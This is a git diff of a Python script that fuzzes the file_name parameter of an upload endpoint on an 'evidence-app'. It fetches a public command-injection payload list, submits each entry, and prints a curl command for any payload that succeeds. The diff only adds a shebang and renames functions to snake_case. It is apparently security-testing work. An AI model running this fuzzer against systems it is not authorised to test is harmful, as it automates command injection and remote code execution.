@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+
 """
 Python script to fuzz evidence-app
 """
@@ -6,7 +8,7 @@ import argparse
 import json
 import requests
 
-def getFuzzList():
+def get_fuzz_list():
     """
     Gets list of payloads from https://github.com/payloadbox/command-injection-payload-list.
     """
@@ -20,7 +22,7 @@ def getFuzzList():
             fuzz_list.append(line)
     return fuzz_list
 
-def uploadFile(file_name, target):
+def upload_file(file_name, target):
     """
     Upload fuzzed file_name with file_data of dGVzdAo= (test).
     """
@@ -31,7 +33,7 @@ def uploadFile(file_name, target):
     response = requests.post(target, headers=headers, data=post_data)
     return response.text
 
-def checkResponse(file_name, target):
+def check_response(file_name, target):
     """
     Check result of uploaded file_name.
     """
@@ -50,11 +52,11 @@ def main():
     parser.add_argument("--target", metavar="CLOUDFRONT_URL", type=str, \
         help="Target web page", required=True)
     args = parser.parse_args()
-    fuzz_list = getFuzzList()
+    fuzz_list = get_fuzz_list()
     for fuzz in fuzz_list:
-        response = uploadFile(fuzz, args.target)
+        response = upload_file(fuzz, args.target)
         if response == "Success":
-            if checkResponse(fuzz, args.target):
+            if check_response(fuzz, args.target):
                 print("\033[32m" + fuzz + "\033[0m worked as command injection for the file_name parameter!")
                 print("  Here is a curl command:\n  \033[32mcurl -X POST " + args.target + " -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d '{\"file_name\":\"" + fuzz + "\",\"file_data\":\"dGVzdAo=\"}'\033[0m")
                 break
